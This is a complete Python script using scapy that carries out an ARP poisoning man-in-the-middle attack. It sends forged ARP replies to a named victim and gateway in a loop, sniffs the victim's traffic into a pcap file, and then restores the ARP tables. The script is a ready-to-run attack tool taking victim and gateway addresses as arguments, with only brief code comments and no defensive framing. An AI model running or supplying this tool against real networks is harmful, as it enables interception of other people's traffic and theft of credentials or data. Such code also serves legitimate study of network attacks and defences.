from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, srp, wrpcap
import os
import sys
import time

# Function to get the MAC address of a target IP
def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

# Class to perform ARP poisoning
class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victim_mac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gateway_mac}.')
        print(f'Victim ({victim}) is at {self.victim_mac}.')
        print('-' * 30)

    # Run the ARP poisoning and sniffing processes
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    # Function to perform ARP poisoning
    def poison(self):
        # Poison the victim
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victim_mac
        print(f'IP src: {poison_victim.psrc}')
        print(f'IP dst: {poison_victim.pdst}')
        print(f'MAC dst: {poison_victim.hwdst}')
        print(f'MAC src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-' * 30)

        # Poison the gateway
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gateway_mac
        print(f'IP src: {poison_gateway.psrc}')
        print(f'IP dst: {poison_gateway.pdst}')
        print(f'MAC dst: {poison_gateway.hwdst}')
        print(f'MAC src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)
        print('Beginning the ARP poison. [CTRL-C to stop]')

        # Continuously send ARP poison packets
        try:
            while True:
                sys.stdout.write('.')
                sys.stdout.flush()
                send(poison_victim)
                send(poison_gateway)
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore()
            sys.exit()

    # Function to sniff packets
    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    # Function to restore the ARP tables
    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victim_mac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)

# Main function to start the ARP poisoning
if __name__ == '__main__':
    if len(sys.argv) == 4:
        victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    else:
        print("Usage: python3 arper.py <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    arper = Arper(victim, gateway, interface)
    arper.run()